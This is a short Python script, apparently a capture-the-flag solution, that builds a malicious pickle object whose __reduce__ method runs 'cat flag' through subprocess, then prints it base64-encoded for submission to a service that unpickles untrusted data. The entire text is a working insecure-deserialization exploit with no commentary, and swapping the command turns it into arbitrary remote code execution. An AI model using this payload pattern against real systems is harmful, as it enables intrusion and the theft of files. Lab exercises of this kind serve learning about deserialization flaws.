import pickle, base64

class test:
  def __reduce__(self):
    import subprocess
    return (subprocess.check_output, (['cat', 'flag'],))

p = pickle.dumps(test())
print(base64.b64encode(p).decode('ASCII'))

#
